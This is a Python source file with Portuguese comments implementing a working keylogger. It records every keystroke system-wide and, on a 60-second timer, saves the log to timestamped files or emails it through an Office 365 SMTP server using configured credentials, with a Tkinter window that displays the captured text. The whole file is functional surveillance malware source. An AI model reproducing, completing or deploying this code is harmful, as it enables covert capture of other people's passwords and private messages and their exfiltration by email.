# Importação das bibliotecas necessárias
import keyboard  # Captura eventos do teclado
import smtplib  # Envio de e-mails
import tkinter as tk  # Interface gráfica //obs: não é necessário, mas facilita a vizualização
import time  # Controle de tempo
from threading import Timer, Thread  # Execução paralela
from datetime import datetime  # Manipulação de datas e horários
from email.mime.multipart import MIMEMultipart  # Estrutura de e-mail
from email.mime.text import MIMEText  # Corpo do e-mail

# Configurações iniciais
SEND_REPORT_EVERY = 60  # Intervalo de envio em segundos
EMAIL_ADDRESS = "email@provider.tld"  # E-mail remetente/destinatário
EMAIL_PASSWORD = "password_here"  # Senha do e-mail

# Classe principal do keylogger
class Keylogger: 
    def __init__(self, interval, report_method="file", gui=None):  
        self.interval = interval  # Intervalo entre relatórios
        self.report_method = report_method  # Método de envio (arquivo ou e-mail)
        self.log = ""  # Armazena os dados capturados
        self.start_dt = datetime.now()  # Início da captura
        self.end_dt = datetime.now()  # Fim da captura
        self.gui = gui  # Referência à interface gráfica

    # Função chamada ao liberar uma tecla
    def callback(self, event):         
        name = event.name  # Nome da tecla
        if len(name) > 1:
            # Teclas especiais
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name  # Adiciona ao log
        if self.gui:
            self.gui.update_log_display(self.log)  # Atualiza a interface

    # Atualiza o nome do arquivo com base no tempo
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    # Salva o log em arquivo
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)

    # Prepara o conteúdo do e-mail
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    # Envia o e-mail com os logs
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - E-mail enviado para {email} com conteúdo: {message}")

    # Gera o relatório e reinicia o ciclo
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # Inicia o keylogger
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)  # Escuta teclas liberadas
        self.report()  # Inicia o ciclo de relatório
        print(f"{datetime.now()} - Keylogger iniciado")
        while True:
            time.sleep(1)  # Mantém o programa rodando

# Classe da interface gráfica
class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger")

        # Label de status
        self.status_label = tk.Label(master, text="Status: Inativo", fg="red")
        self.status_label.pack()

        # Área de exibição do log
        self.log_display = tk.Text(master, height=15, width=70)
        self.log_display.pack()

        # Botão para iniciar o keylogger
        self.start_button = tk.Button(master, text="Iniciar", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        # Instancia o keylogger com referência à GUI
        self.keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file", gui=self)

    # Inicia o keylogger em uma thread separada
    def start_keylogger(self):
        self.status_label.config(text="Status: Ativo", fg="green")
        thread = Thread(target=self.keylogger.start)
        thread.daemon = True
        thread.start()

    # Atualiza o conteúdo do log na interface
    def update_log_display(self, log_text):
        self.log_display.delete("1.0", tk.END)
        self.log_display.insert(tk.END, log_text)

# Ponto de entrada do programa
if __name__ == "__main__":
    root = tk.Tk()
    gui = KeyloggerGUI(root)
    root.mainloop()
